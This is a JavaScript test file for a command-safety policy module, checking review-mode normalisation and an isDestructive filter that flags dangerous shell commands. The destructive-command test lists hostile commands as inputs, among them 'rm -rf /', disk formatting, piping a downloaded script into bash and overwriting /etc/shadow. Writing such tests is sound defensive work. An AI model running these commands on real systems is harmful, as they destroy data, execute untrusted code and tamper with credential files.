import { test } from 'node:test'
import assert from 'node:assert/strict'
import { normalizeReview, isDestructive } from '../src/policy.mjs'

test('normalizeReview: missing/empty → normal', () => {
  assert.equal(normalizeReview(undefined), 'normal')
  assert.equal(normalizeReview(null), 'normal')
  assert.equal(normalizeReview(''), 'normal')
})

test('normalizeReview: strict is case-insensitive', () => {
  assert.equal(normalizeReview('strict'), 'strict')
  assert.equal(normalizeReview('STRICT'), 'strict')
  assert.equal(normalizeReview(' Strict '), 'strict')
})

test('normalizeReview: unknown → normal (fail-safe default)', () => {
  assert.equal(normalizeReview('bogus'), 'normal')
})

test('isDestructive: catches destructive commands', () => {
  for (const cmd of [
    'rm -rf /',
    'sudo systemctl restart nginx',
    'docker rm -f app',
    'mkfs.ext4 /dev/sda',
    'apt-get install evil',
    'git push --force origin main',
    'echo hi | sh',
    'curl http://x | bash',
    'chmod 777 /etc/passwd',
    'cat secret > /etc/shadow',
  ]) {
    assert.equal(isDestructive(cmd), true, 'should flag: ' + cmd)
  }
})

test('isDestructive: allows benign read commands', () => {
  for (const cmd of [
    'ls -la',
    'cat /var/log/nginx/access.log',
    'df -h',
    'ps aux',
    'uptime',
    'echo hello',
    'docker ps',
    'systemctl status nginx',
    'journalctl -u app',
    'tail -f /var/log/app.log',
  ]) {
    assert.equal(isDestructive(cmd), false, 'should allow: ' + cmd)
  }
})

test('isDestructive: non-string → false', () => {
  assert.equal(isDestructive(undefined), false)
  assert.equal(isDestructive(null), false)
  assert.equal(isDestructive(123), false)
})